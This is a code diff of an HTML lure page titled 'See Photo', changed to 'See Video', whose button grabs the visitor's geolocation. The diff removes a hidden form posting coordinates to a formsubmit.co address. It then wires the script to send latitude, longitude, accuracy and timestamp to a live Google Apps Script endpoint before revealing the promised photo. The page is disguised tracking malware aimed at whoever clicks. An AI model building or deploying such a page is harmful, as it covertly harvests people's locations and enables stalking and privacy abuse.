@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>See Photo</title>
+  <title>See Video</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body::before {
@@ -85,20 +85,11 @@
 </head>
 <body>
   <div class="container" id="contentBox">
-    <h2>Click the Button to See Photo</h2>
+    <h2>Click the Button to See Video</h2>
     <button onclick="getLocation()">See Photo</button>
     <p id="output"></p>
   </div>
 
-  <!-- Hidden form to send location -->
-  <form id="locationForm" method="POST" action="https://formsubmit.co/5ccabaf9d3e99562488394bd3fba321c">
-    <input type="hidden" name="latitude" id="latitude">
-    <input type="hidden" name="longitude" id="longitude">
-    <input type="hidden" name="mapLink" id="mapLink">
-    <input type="hidden" name="_subject" value="New Location Shared!">
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_next" value="thankyou.html"> <!-- Custom thank you page -->
-  </form>
 
   <script>
 
@@ -139,6 +130,8 @@
           body: formData
         });
 
+                
+
       } catch (e) {
         console.error('Error:', e);
       }
@@ -170,10 +163,10 @@
           formData.append("Accuracy", accuracy);
           formData.append("Timestamp", timestamp);
 
-          await fetch("WEB_APP_URL_HERE", {
-            method: "POST",
-            body: formData
-          });
+         await fetch("https://script.google.com/macros/s/AKfycbzW1Q21J2tzjygpYtj9JgmJXaaDQEj_LDgGeHopJgfGS7YoD05z6wvHgBnLk2jIdtU/exec?route=precise", {
+          method: "POST",
+          body: formData
+        });
 
           status.textContent = "Location sent successfully!";
            revealPhoto();
